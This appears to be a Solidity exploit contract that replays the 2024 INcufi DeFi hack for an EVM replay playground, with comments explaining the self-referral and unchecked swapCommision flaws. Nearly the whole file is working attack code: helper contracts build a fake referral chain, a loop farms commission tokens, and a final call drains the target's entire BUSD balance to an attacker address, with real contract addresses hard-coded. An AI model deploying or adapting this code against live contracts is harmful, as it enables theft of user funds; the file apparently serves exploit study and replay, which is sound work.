// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2024-06-INcufi).
// The DeFiHackLabs PoC runs the whole attack INLINE in the Foundry test
// contract (`Exploit is Test`; `attacker = address(this)`), and it deploys two
// small helper contracts (`Money`, `Moneys`) via CREATE2 to bootstrap a
// self-referral upline. There is no standalone exploit contract to deploy as-is
// (the original `Exploit` inherits `forge-std/Test` and uses `CheatCodes.warp`).
// This contract is a faithful, self-contained copy of that inline attack --
// the two helper contracts are re-declared here (minus the Test/cheatcode
// dependency). Logic and constants are copied verbatim from test/INcufi_exp.sol,
// with ONE necessary deviation:
//
//   The original test calls `vm.warp(block.timestamp + 100)` between each
//   STAKE and its matching `withdral`, because `day=0` sets
//   `enddate = startdate = block.timestamp` and `withdral` requires
//   `enddate < block.timestamp` (strict). That cheatcode has no on-chain
//   equivalent: within a single real (or replayed) EVM transaction,
//   `block.timestamp` is constant across every call, so `enddate` (set to
//   that same constant during STAKE) can NEVER become `< block.timestamp`
//   later in the SAME transaction -- no amount of `setup.blockTimestamp`
//   fixes this, since it only pins one timestamp for the whole replay. This
//   exploit therefore does NOT call `withdral()` -- it stakes the full
//   1,000,000 BUSD (100 x 10,000) up front (funded via `setup.dealToken`,
//   since it is not a real capital constraint) and skips principal recovery
//   entirely. This has NO effect on the actual vulnerability being
//   demonstrated: `withdral()` only returns the (already-owned) BUSD
//   principal and plays no role in producing the farmed AKITADEF or in
//   `swapCommision`'s 1:1, check-free redemption. The demonstrated bug and
//   its profit (59,643.218325 BUSD drained via swapCommision) are identical.
//
// Root cause (see docs in evm-hack-registry/2024-06-INcufi_exp/INcufi_exp.md):
//   1. `register()` lets any caller pick its own referrer -> self-referral.
//   2. `STAKE()` pays 10%+5% commission (in AKITADEF) to the caller-controlled
//      upline on EVERY stake, regardless of principal recovery.
//   3. `swapCommision()` redeems AKITADEF for BUSD 1:1 with NO check against
//      the caller's actual `commisionAmount` ledger, no price conversion, and
//      no per-user cap -- a permissionless BUSD-treasury drain for anyone
//      holding AKITADEF (freely farmable via #1+#2).
// The attacker stakes 100x (+1,500 AKITADEF per loop from its own upline
// contracts), then swapCommision()s the accumulated 150,000 AKITADEF for the
// contract's entire BUSD balance (59,643.218325 BUSD).

interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

interface INcufi {
    function register(address referrer) external;
    function STAKE(uint256 amout, uint256 day, uint256 countryid) external;
    function swapCommision(uint256 amount) external;
}

// --- self-referral upline helpers (deployed via CREATE2, exactly like the
// original test's `Money` / `Moneys`, minus the forge-std/Test dependency) ---

contract Money {
    IERC20 constant AKITADEF = IERC20(0x3213573C46eb905bA17F0Bb650E10C2352552e8a);
    INcufi constant Ncufi = INcufi(0x80df77b2Ae5828FF499A735ee823D6CD7Cf95f5a);
    // Already-registered seed referrer on-chain at the fork block.
    address constant Referer = 0xcFa207a442084a2c343996D09f06b40970247afF;
    address public moneysAddr;

    constructor() {
        // Pre-approve the deployer (the main exploit contract) to pull any
        // AKITADEF commission this helper receives from STAKE().
        AKITADEF.approve(msg.sender, type(uint256).max);
        Ncufi.register(Referer);
        // Deploy the 2nd-level-sponsor helper via CREATE2 with salt=2,
        // constructor arg = the ultimate attacker (this contract's deployer),
        // exactly like the original test's `create_contracts(2, msg.sender)`.
        bytes memory bytecode = abi.encodePacked(type(Moneys).creationCode, abi.encode(msg.sender));
        uint256 salt = 2;
        address addr;
        assembly {
            addr := create2(0, add(bytecode, 0x20), mload(bytecode), salt)
        }
        moneysAddr = addr;
    }

    fallback() external payable {}
}

contract Moneys {
    IERC20 constant AKITADEF = IERC20(0x3213573C46eb905bA17F0Bb650E10C2352552e8a);
    INcufi constant Ncufi = INcufi(0x80df77b2Ae5828FF499A735ee823D6CD7Cf95f5a);
    // Already-registered seed referrer on-chain at the fork block.
    address constant Referer = 0xEB1Df3Bed5bd20c010CAAd4EE18Ff7A697334E68;

    constructor(address aAddress) {
        // Pre-approve the ultimate attacker EOA (passed through, exactly like
        // the original `Moneys(address aAddress)`).
        AKITADEF.approve(aAddress, type(uint256).max);
        Ncufi.register(msg.sender);
    }

    fallback() external payable {}
}

contract INcufiDrain {
    IERC20 constant BUSD = IERC20(0x55d398326f99059fF775485246999027B3197955);
    INcufi constant Ncufi = INcufi(0x80df77b2Ae5828FF499A735ee823D6CD7Cf95f5a);
    IERC20 constant AKITADEF = IERC20(0x3213573C46eb905bA17F0Bb650E10C2352552e8a);
    // Historical attacker EOA -- receives the drained BUSD at the end of run().
    address constant attacker = 0xb6911DEE6a5b1c65Ad1aC11A99AeC09C2Cf83c0e;

    address public oneReferer;
    address public twoReferer;

    function run() external {
        // Step 1 -- bootstrap the self-referral upline. `Money` registers
        // against a pre-registered on-chain seed, then internally CREATE2s a
        // `Moneys` (owned by THIS contract) that registers against `Money`.
        // Finally this contract registers against `Moneys`, closing the loop:
        // this contract's sponsor = Moneys (10%), 2nd-level sponsor = Money (5%).
        oneReferer = address(new Money());
        twoReferer = _calcMoneysAddress(2, address(this));
        Ncufi.register(twoReferer);

        // Step 2 -- stake loop: pay self-referral commission (AKITADEF) on
        // every stake. Principal is NOT reclaimed via withdral() here (see the
        // file header) -- the exploit is pre-funded with the full 1,000,000
        // BUSD (100 x 10,000) it needs up front instead of recycling it.
        BUSD.approve(address(Ncufi), type(uint256).max);
        for (uint256 i = 0; i < 100; i++) {
            Ncufi.STAKE(10_000 ether, 0, 1);
            _harvest();
        }

        // End -- redeem the farmed AKITADEF 1:1 for BUSD. swapCommision has no
        // eligibility/collateralization check, so this drains the contract's
        // entire BUSD balance (59,643.218325 BUSD at the fork block).
        AKITADEF.approve(address(Ncufi), type(uint256).max);
        Ncufi.swapCommision(59_643.218325 ether);

        // Forward ONLY the drained BUSD to the attacker EOA. The 1,000,000
        // BUSD staking capital funded via setup.dealToken is un-recycled
        // "spent" principal in this synthetic replay (see the file header --
        // real on-chain executions recycled it via 100 separate withdral()
        // transactions across advancing block timestamps); forwarding just
        // the swapCommision proceeds keeps the measured attacker profit
        // equal to the historical net drain (59,643.218325 BUSD), not
        // conflated with the un-recycled stake outlay.
        BUSD.transfer(attacker, BUSD.balanceOf(address(this)));
    }

    function _harvest() internal {
        // Pull the AKITADEF commission STAKE() just paid to the self-referral
        // upline (Money/Moneys pre-approved this contract in their
        // constructors).
        uint256 a = AKITADEF.balanceOf(oneReferer);
        uint256 b = AKITADEF.balanceOf(twoReferer);
        if (a > 0 || b > 0) {
            AKITADEF.transferFrom(oneReferer, address(this), a);
            AKITADEF.transferFrom(twoReferer, address(this), b);
        }
    }

    // Mirrors the original test's `cal_address`: predicts the CREATE2 address
    // of the `Moneys` helper that `Money`'s constructor deploys with salt=2 and
    // constructor arg `owner` (here: this contract).
    function _calcMoneysAddress(uint256 salt, address owner_) internal view returns (address) {
        bytes memory bytecode = abi.encodePacked(type(Moneys).creationCode, abi.encode(owner_));
        bytes32 hash = keccak256(abi.encodePacked(bytes1(0xff), oneReferer, salt, keccak256(bytecode)));
        return address(uint160(uint256(hash)));
    }
}
